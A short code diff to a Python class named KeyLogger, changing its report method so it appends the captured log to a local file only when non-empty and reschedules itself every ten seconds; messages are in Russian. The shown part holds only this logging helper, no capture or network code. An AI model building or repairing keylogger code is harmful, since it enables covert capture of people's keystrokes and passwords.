@@ -25,12 +25,13 @@ class KeyLogger:
             self.log += f" [Error: {e}] "
 
     def report(self):
-        try:
-            with open(self.path, "a") as file:
-                file.write(self.log)
-                self.log = ""
-        except Exception as e:
-            print(f"Ошибка записи в файл: {e}")
+        if self.log.strip():
+            try:
+                with open(self.path, "a") as file:
+                    file.write(self.log)
+                self.log = "" 
+            except Exception as e:
+                print(f"Ошибка записи в файл: {e}")
         self.timer = threading.Timer(10, self.report)
         self.timer.start()
 
